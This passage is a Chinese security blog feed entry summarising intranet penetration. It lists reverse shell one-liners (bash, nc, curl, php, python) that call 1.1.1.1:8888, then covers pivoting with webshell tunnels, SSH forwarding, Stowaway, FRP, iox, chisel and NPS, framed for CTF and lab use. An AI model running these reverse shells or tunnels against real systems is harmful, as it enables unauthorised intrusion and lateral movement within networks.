    <content type="html"><![CDATA[<p>本文中使用的代理工具可通过我的脚本一键下载<a href="https://github.com/dr0n1/CTF_misc_auto_deploy">https://github.com/dr0n1/CTF_misc_auto_deploy</a></p><h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><p>推荐在本地部署一个<a href="https://github.com/0dayCTF/reverse-shell-generator">reverse-shell-generator</a>，可以很方便的查看命令</p><p>以下是几个常用的</p><h2 id="bash-i"><a href="#bash-i" class="headerlink" title="bash -i"></a>bash -i</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">/bin/sh -i &gt;&amp; /dev/tcp/1.1.1.1/8888 0&gt;&amp;1<br></code></pre></td></tr></table></figure><h2 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">nc -e</span><br>nc 1.1.1.1 8888 -e /bin/sh<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">nc -c</span><br>nc -c /bin/sh 1.1.1.1 8888<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">nc <span class="hljs-built_in">mkfifo</span></span><br>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 1.1.1.1 8888 &gt;/tmp/f<br></code></pre></td></tr></table></figure><h2 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">C=&#x27;curl -Ns telnet://1.1.1.1:8888&#x27;; $C &lt;/dev/null 2&gt;&amp;1 | /bin/sh 2&gt;&amp;1 | $C &gt;/dev/null<br></code></pre></td></tr></table></figure><h2 id="php"><a href="#php" class="headerlink" title="php"></a>php</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">php -r &#x27;$sock=fsockopen(&quot;1.1.1.1&quot;,8888);exec(&quot;/bin/sh &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;<br><br>php -r &#x27;$sock=fsockopen(&quot;1.1.1.1&quot;,8888);system(&quot;/bin/sh &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;<br></code></pre></td></tr></table></figure><h2 id="python"><a href="#python" class="headerlink" title="python"></a>python</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;1.1.1.1&quot;,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/sh&quot;)&#x27;<br><br>python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;1.1.1.1&quot;,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/sh&quot;)&#x27;<br><br>python3 -c &#x27;import os,pty,socket;s=socket.socket();s.connect((&quot;1.1.1.1&quot;,8888));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(&quot;/bin/sh&quot;)&#x27;<br></code></pre></td></tr></table></figure><h1 id="HTTP-隧道"><a href="#HTTP-隧道" class="headerlink" title="HTTP 隧道"></a>HTTP 隧道</h1><p>常用的也就是一个Neo-reGorg，其他的<a href="https://github.com/SECFORCE/Tunna">Tunna</a> <a href="https://github.com/FunnyWolf/pystinger">pystinger</a> 等用的就比较少了</p><h2 id="reGeorg"><a href="#reGeorg" class="headerlink" title="reGeorg"></a>reGeorg</h2><p><a href="https://github.com/sensepost/reGeorg">https://github.com/sensepost/reGeorg</a></p><ol><li>上传 tunnel 文件</li><li>连接 WEB 服务器，并在本地建立 socks5 代理</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp<br></code></pre></td></tr></table></figure><h2 id="Neo-reGorg"><a href="#Neo-reGorg" class="headerlink" title="Neo-reGorg"></a>Neo-reGorg</h2><p><a href="https://github.com/L-codes/Neo-reGeorg">https://github.com/L-codes/Neo-reGeorg</a></p><ol><li>设置密码生成 tunnel.(aspx|ashx|jsp|jspx|php) 并上传到WEB服务器</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python neoreg.py generate -k password<br></code></pre></td></tr></table></figure><ol start="2"><li>使用 neoreg.py 连接 WEB 服务器，在本地建立 socks5 代理</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 neoreg.py -k password -p 6666 -u http://xx/tunnel.php<br></code></pre></td></tr></table></figure><h1 id="SSH隧道"><a href="#SSH隧道" class="headerlink" title="SSH隧道"></a>SSH隧道</h1><p>常见参数</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs text">-C：压缩传输，提高传输速度<br>-f：表示 SSH 连接成功后，转入后台运行<br>-N：建立静默连接，表示只连接远程主机，不打开远程 shell<br>-g：允许远程主机连接本地用于转发的端口<br>-L：本地端口转发 (L 参数一共接受三个值，分别是 本地端口:目标主机:目标主机端口)<br>-R：远程端口转发 (R 参数也是接受三个值，分别是 远程主机端口:目标主机:目标主机端口)<br>-D：动态转发（SOCKS 代理）<br>-P：指定 SSH 端口<br></code></pre></td></tr></table></figure><p><img src="/img/summary/daili-1.png" alt="SSH隧道拓扑"></p><h2 id="本地转发"><a href="#本地转发" class="headerlink" title="本地转发"></a>本地转发</h2><p>本地转发的意思是将远程主机的某个端口的数据转发到本地服务器的指定端口</p><p>这里假设192.168网段是公网，攻击机可以直连</p><p>在<strong>攻击机</strong>上执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh -CfNg -L 6677:172.16.10.10:8080 root@192.168.100.167<br><span class="hljs-comment">#ssh端口非默认可以用 -p 指定</span><br></code></pre></td></tr></table></figure><p>就能将边界服务器上host2的流量转发到本地的6677端口上</p><p>访问本地的6677端口就能访问到内网的host2</p><p><img src="/img/summary/daili-2.png"></p><h2 id="远程转发"><a href="#远程转发" class="headerlink" title="远程转发"></a>远程转发</h2><p>假设上图中的host1完全处于内网或者做了策略，使得攻击机访问不了host1了，但是host1可以访问vps(攻击机)，就需要远程转发</p><p>在<strong>host1</strong>上执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh -CfNg -R 6666:172.16.10.11:8090 vps<br></code></pre></td></tr></table></figure><p>然后访问vps的6666端口就可以访问到host3了</p><p>由于对于 host1 来说，vps 是远程主机，所以这种情况就被称为远程端口绑定</p><hr><p>这里有一点需要注意，如果使用的是默认配置，可能导致转发后的进程是127.0.0.1</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tcp        0      0 127.0.0.1:6666          0.0.0.0:*               LISTEN      25278/sshd: root<br></code></pre></td></tr></table></figure><p>如果需要是0.0.0.0，则需要修改vps上ssh的配置文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#/etc/ssh/sshd_config</span><br><br>GatewayPorts <span class="hljs-built_in">yes</span><br></code></pre></td></tr></table></figure><p><code>systemctl restart sshd</code></p><h2 id="动态转发"><a href="#动态转发" class="headerlink" title="动态转发"></a>动态转发</h2><p>动态端口映射就是建立一个 SSH 加密的 SOCKS 4&#x2F;5 代理通道</p><p>在vps上或者host1本身上执行都行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh -CfNg -D 0.0.0.0:4455 root@192.168.100.167<br></code></pre></td></tr></table></figure><p>然后将执行命令的主机的ip和4455端口做socks5代理</p><hr><p>另一种稍微麻烦一点的方式：</p><p>先在<strong>host1</strong>上执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh -qTfnN -D 0.0.0.0:7000 root@localhost<br></code></pre></td></tr></table></figure><p>然后转发出去即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh -qTfnN -R 0.0.0.0:6699:0.0.0.0:7000 vps<br></code></pre></td></tr></table></figure><p>将vps的6699端口配为socks5代理ip后就可以访问内网的host2和host3了</p><p><img src="/img/summary/daili-3.png"></p><h1 id="传输层隧道"><a href="#传输层隧道" class="headerlink" title="传输层隧道"></a>传输层隧道</h1><p>上面的http隧道，ssh隧道，包括不常用的dns隧道，都属于应用层，下面是一些常用的 端口转发 &amp; 内网代理工具</p><p>这些综合工具支持多种协议，这里使用其中的socks协议进行内网的代理</p><p>后续工具的命令以此图为参照</p><p><img src="/img/summary/daili-5.png" alt="虚拟机模拟拓扑图"></p><h2 id="Stowaway"><a href="#Stowaway" class="headerlink" title="Stowaway"></a>Stowaway</h2><p><a href="https://github.com/ph4ntonn/Stowaway">https://github.com/ph4ntonn/Stowaway</a></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs text">admin参数:<br>-l 被动模式下的监听地址[ip]:&lt;port&gt;<br>-s 节点通信加密密钥,所有节点(admin&amp;&amp;agent)必须一致<br>-c 主动模式下的目标节点地址<br>--socks5-proxy socks5代理服务器地址<br>--socks5-proxyu socks5代理服务器用户名(可选)<br>--socks5-proxyp socks5代理服务器密码(可选)<br>--http-proxy http代理服务器地址<br>--down 下游协议类型,默认为裸TCP流量,可选HTTP/WS<br>--tls-enable 为节点通信启用TLS，在启用TLS后，AES加密将被禁用<br>--domain 指定TLS SNI/WebSocket域名，若为空，默认为目标节点地址<br>--heartbeat 开启心跳包<br><br><br>agent参数:<br>-l 被动模式下的监听地址[ip]:&lt;port&gt;<br>-s 节点通信加密密钥<br>-c 主动模式下的目标节点地址<br>--socks5-proxy socks5代理服务器地址<br>--socks5-proxyu socks5代理服务器用户名(可选)<br>--socks5-proxyp socks5代理服务器密码(可选)<br>--http-proxy http代理服务器地址<br>--reconnect 重连时间间隔<br>--rehost 端口复用时复用的IP地址<br>--report 端口复用时复用的端口号<br>--up 上游协议类型,默认为裸TCP流量,可选HTTP/WS<br>--down 下游协议类型,默认为裸TCP流量,可选HTTP/WS<br>--cs 运行平台的shell编码类型，默认为utf-8，可选gbk<br>--tls-enable 为节点通信启用TLS，在启用TLS后，AES加密将被禁用<br>--domain 指定TLS SNI/WebSocket域名，若为空，默认为目标节点地址<br></code></pre></td></tr></table></figure><hr><p><strong>单层代理</strong></p><p>边界服务器(host1)运行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./linux_x64_admin -l 7000 -s 123<br></code></pre></td></tr></table></figure><p>客户端(host2)运行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./linux_x64_agent -c host1_ip:7000 -s 123 --reconnect 8<br></code></pre></td></tr></table></figure><p>连接成功后在服务器端的交互窗口建立代理</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">use 0<br>socks 6666<br></code></pre></td></tr></table></figure><p><img src="/img/summary/daili-6.png"></p><p>使用host1:6666作为socks代理后就可以进行后续其他操作了</p><p><img src="/img/summary/daili-7.png"></p><hr><p><strong>多层代理</strong></p><p>边界服务器(host1)运行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./linux_x64_admin -l 7000 -s 123<br></code></pre></td></tr></table></figure><p>外层主机(host2)运行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./linux_x64_agent -c host1_ip:7000 -s 123 --reconnect 8<br></code></pre></td></tr></table></figure><p>建立连接后在控制端运行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">use 0<br>listen<br>1<br>2233<br></code></pre></td></tr></table></figure><p>相当于在host2上监听2233端口</p><p><img src="/img/summary/daili-8.png"></p><p>然后用内层主机(host4)连接外层主机(host2)的2233端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./linux_x64_agent -c host2:2233 -s 123 --reconnect 8<br></code></pre></td></tr></table></figure><p>控制端等待节点加入后建立socks代理，注意需要选择新节点</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">back<br>use 1<br>socks 6666<br></code></pre></td></tr></table></figure><p><img src="/img/summary/daili-9.png"></p><p><img src="/img/summary/daili-10.png"></p><h2 id="FRP"><a href="#FRP" class="headerlink" title="FRP"></a>FRP</h2><p><a href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a></p><p>将 frpc 复制到内网服务所在的机器上。<br>将 frps 复制到拥有公网 IP 地址的机器上，并将它们放在任意目录。</p><p>编写配置文件，目前支持的文件格式包括 TOML&#x2F;YAML&#x2F;JSON，旧的 INI 格式仍然支持，但已经不再推荐。<br>使用以下命令启动服务器：<code>./frps -c ./frps.toml</code><br>使用以下命令启动客户端：<code>./frpc -c ./frpc.toml</code></p><hr><p><strong>单层代理</strong></p><p>服务端(host1)监听端口然后启动</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># frps.toml</span><br>bindPort = 7000<br></code></pre></td></tr></table></figure><p>客户端(host2)配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># frpc.toml</span><br>serverAddr = <span class="hljs-string">&quot;host1_ip&quot;</span><br>serverPort = 7000<br><br>[[proxies]]<br>name = <span class="hljs-string">&quot;socks5&quot;</span><br><span class="hljs-built_in">type</span> = <span class="hljs-string">&quot;tcp&quot;</span><br>plugin.type = <span class="hljs-string">&quot;socks5&quot;</span><br>remotePort = 6666<br></code></pre></td></tr></table></figure><p>用proxifier或proxychains指定host1_ip和6666端口即可</p><p>还可以选择使用web控制面板或者添加token</p><hr><p><strong>多层代理</strong></p><p>服务端(host1)配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># frps.toml</span><br>bindPort = 7000<br></code></pre></td></tr></table></figure><p>外层主机(host2)同时当(host1的)客户端和(host4的)服务端</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># frpc.toml</span><br><span class="hljs-comment">#端口转发</span><br><span class="hljs-comment">#将本地6666端口转发到服务端的6666端口</span><br><br>serverAddr = <span class="hljs-string">&quot;host1_ip&quot;</span><br>serverPort = 7000<br><br>[[proxies]]<br>name = <span class="hljs-string">&quot;portforward&quot;</span><br><span class="hljs-built_in">type</span> = <span class="hljs-string">&quot;tcp&quot;</span><br>localIP = <span class="hljs-string">&quot;127.0.0.1&quot;</span><br>localPort = 6666<br>remotePort = 6666<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># frps.toml</span><br>bindPort = 7001<br></code></pre></td></tr></table></figure><p>内层主机(host4)配置文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># frpc.toml</span><br>serverAddr = <span class="hljs-string">&quot;host2_ip&quot;</span><br>serverPort = 7001<br><br>[[proxies]]<br>name = <span class="hljs-string">&quot;socks5&quot;</span><br><span class="hljs-built_in">type</span> = <span class="hljs-string">&quot;tcp&quot;</span><br>plugin.type = <span class="hljs-string">&quot;socks5&quot;</span><br>remotePort = 6666<br></code></pre></td></tr></table></figure><p><img src="/img/summary/daili-16.png"></p><h2 id="iox"><a href="#iox" class="headerlink" title="iox"></a>iox</h2><p>iox 是一个端口转发 &amp; 内网代理工具，功能类似于lcx&#x2F;ew</p><p><a href="https://github.com/EddieIvan01/iox">https://github.com/EddieIvan01/iox</a></p><p><strong>端口转发</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 监听 0.0.0.0:8888 和0.0.0.0:9999，将两个连接间的流量转发</span><br>./iox fwd -l 8888 -l 9999<br><br><span class="hljs-comment"># 监听0.0.0.0:8888，把流量转发到1.1.1.1:9999</span><br>./iox fwd -l 8888 -r 1.1.1.1:9999<br><br><span class="hljs-comment"># 连接1.1.1.1:8888和1.1.1.1:9999, 在两个连接间转发</span><br>./iox fwd -r 1.1.1.1:8888 -r 1.1.1.1:9999<br></code></pre></td></tr></table></figure><p><strong>单层正向代理</strong></p><p>直接在边界服务器(host1)上启动Socks5服务就好了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./iox proxy -l 6666<br></code></pre></td></tr></table></figure><p><strong>二层正向代理</strong></p><p>外层主机(host2)启动socks服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./iox proxy -l 5555<br></code></pre></td></tr></table></figure><p>边界服务器(host1)监听端口并转发流量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./iox fwd -l 6666 -r host2:5555<br></code></pre></td></tr></table></figure><p><strong>多层正向代理</strong></p><p>内层主机(host4)启动socks服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./iox proxy -l 4444<br></code></pre></td></tr></table></figure><p>外层主机(host2)监听端口并转发流量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./iox fwd -l 5555 -r host4:4444<br></code></pre></td></tr></table></figure><p>边界服务器(host1)监听端口并转发流量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./iox fwd -l 6666 -r host2:5555<br></code></pre></td></tr></table></figure><p><img src="/img/summary/daili-15.png"></p><hr><hr><p><strong>一层反向代理</strong></p><p>linux攻击机上监听端口并转发</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./iox proxy -l 7000 -l 6666<br></code></pre></td></tr></table></figure><p>边界主机(host1)将流量转发到攻击机</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./iox proxy -r server:7000<br></code></pre></td></tr></table></figure><p><strong>二层反向代理</strong></p><p>linux攻击机上监听端口并转发</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./iox proxy -l 7000 -l 6666<br></code></pre></td></tr></table></figure><p>边界主机(host1)监听并将流量转发到攻击机</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./iox fwd -l 7001 -r server:7000<br></code></pre></td></tr></table></figure><p>外层主机(host2)开启socks代理并转发到host1</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./iox proxy -r host1:7001<br></code></pre></td></tr></table></figure><p><strong>多层反向代理</strong></p><p>linux攻击机上监听端口并转发</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./iox proxy -l 7000 -l 6666<br></code></pre></td></tr></table></figure><p>边界主机(host1)监听并将流量转发到攻击机</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./iox fwd -l 7001 -r server:7000<br></code></pre></td></tr></table></figure><p>外层主机(host2)监听并将流量转发到host1</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./iox fwd -l 7002 -r host1:7001<br></code></pre></td></tr></table></figure><p>内层主机(host4)开启socks代理并转发到host2</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./iox proxy -r host2:7002<br></code></pre></td></tr></table></figure><p><img src="/img/summary/daili-14.png"></p><h2 id="chisel"><a href="#chisel" class="headerlink" title="chisel"></a>chisel</h2><p><a href="https://github.com/jpillora/chisel">https://github.com/jpillora/chisel</a></p><p><strong>单层代理</strong></p><p>在服务端(host1)运行，表示开启7000端口来监听进行反向代理</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./chisel server -p 7000 --reverse<br></code></pre></td></tr></table></figure><p>客户端(host2)运行，表示连接到服务端(host1)的7000端口，把host1:6666作为socks5代理</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./chisel client host1:7000 R:0.0.0.0:6666:socks<br></code></pre></td></tr></table></figure><p><img src="/img/summary/daili-4.png"></p><p><strong>多层代理</strong></p><p>还是先在服务端(host1)运行，表示开启7000端口来监听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./chisel server -p 7000 --reverse<br></code></pre></td></tr></table></figure><p>外层主机(host2)即当客户端也当服务端<br>client的命令表示连接到服务端(host1)的7000端口，并将host4转来的5555的流量再次转到服务端(host1)上的6666端口<br>server的命令表示开启7001端口监听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">./chisel client host1:7000 R:0.0.0.0:6666:127.0.0.1:5555<br>./chisel server -p 7001 --reverse<br></code></pre></td></tr></table></figure><p>内层主机(host4)运行，连到host2:7001，并将流量转发到host2的5555端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./chisel client host2:7001 R:0.0.0.0:5555:socks<br></code></pre></td></tr></table></figure><p>搭建完毕后可以看到host1控制台有一条这样的信息：<code>server: session#1: tun: proxy#R:6666=&gt;5555: Listening</code></p><p>host2的控制台有一条：<code>server: session#1: tun: proxy#R:5555=&gt;socks: Listening</code></p><p>使用host1:6666端口作为socks代理即可</p><h2 id="NPS"><a href="#NPS" class="headerlink" title="NPS"></a>NPS</h2><blockquote><p>nps貌似已经不更新了，存在不少bug，非比赛环境需要谨慎使用，社区中有许多二开版本，可以自行查看</p></blockquote><blockquote><p>官方版本存在越权漏洞。漏洞原理是利用伪造两个参数auth_key、timestamp来完成越权操作的，修复方式是注释掉auth_crypt_key，并修改auth_key的值为随机值，auth_key记得去掉注释<br><a href="https://github.com/weishen250/npscrack">https://github.com/weishen250/npscrack</a></p></blockquote><p>服务端安装后使用 nps start 启动</p><p>然后访问8080端口 账户密码默认为 admin&#x2F;123</p><p>选择新建一个客户端</p><p><img src="/img/summary/daili-11.png"></p><p>然后把客户端文件传递到外层主机上后执行提供的命令</p><p><img src="/img/summary/daili-12.png"></p><p>然后新增socks代理即可</p><p><img src="/img/summary/daili-13.png"></p><h1 id="linux下全局代理"><a href="#linux下全局代理" class="headerlink" title="linux下全局代理"></a>linux下全局代理</h1><p>在windows下可以用proxifier轻松实现进程级的全局代理</p><p>但是在linux下会有很多命令或者软件的流量不走proxychains的情况出现</p><p>这里可以用clash解决</p><p>首先在service mode点击安装，旁边的地球变绿就ok了</p><p><img src="/img/summary/daili-17.png"></p><p>然后在profiles的地方编辑配置文件</p><p><img src="/img/summary/daili-18.png"></p><p>选中自己配置的选项后就能实现全局代理了，注意用tun mode</p><p><img src="/img/summary/daili-19.png"></p><p>包括ping命令等都可以走代理了</p><p><img src="/img/summary/daili-20.png"></p><hr><p>参考文章：</p><p><a href="http://myblog.ac.cn/archives/2023-01-01-15-38-00">Frp内网多层隧道搭建</a><br><a href="https://www.geekby.site/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/#1-%E5%9C%BA%E6%99%AF%E4%BB%8B%E7%BB%8D">内网隧道穿透</a><br><a href="https://fushuling.com/index.php/2023/09/21/%e5%86%85%e7%bd%91%e4%bb%a3%e7%90%86%e6%90%ad%e5%bb%ba/">内网代理搭建</a><br><a href="https://3nd.xyz/post/2020-05-25-AD-Pentest-Hidden-Tunnel/#%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF">内网渗透测试 &lt;3&gt; 隧道技术</a><br><a href="https://mp.weixin.qq.com/s/yUs0Tc3VDCoskc0dSJY1GQ">【Tips+1】IOX 多层网络正向穿透</a><br><a href="https://mp.weixin.qq.com/s/9mcF_Snk-loPO-ApI5ECag">【Tips+1】IOX 反向穿透四层网段</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;本文中使用的代理工具可通过我的脚本一键下载&lt;a href=&quot;https://github.com/dr0n1/CTF_misc_auto_deploy&quot;&gt;https://github.com/dr0n1/CTF_misc_auto_deploy&lt;/a&gt;&lt;/p&gt;
&lt;h1 id</summary>
      
    
    
    
    <category term="总结" scheme="https://www.dr0n.top/categories/%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="总结" scheme="https://www.dr0n.top/tags/%E6%80%BB%E7%BB%93/"/>
    
    <category term="内网渗透" scheme="https://www.dr0n.top/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>2024年“羊城杯”粤港澳大湾区网络安全大赛 wp</title>
    <link href="https://www.dr0n.top/posts/da856207/"/>
    <id>https://www.dr0n.top/posts/da856207/</id>
    <published>2024-08-28T01:00:00.000Z</published>
    <updated>2025-07-27T10:03:24.226Z</updated>
    
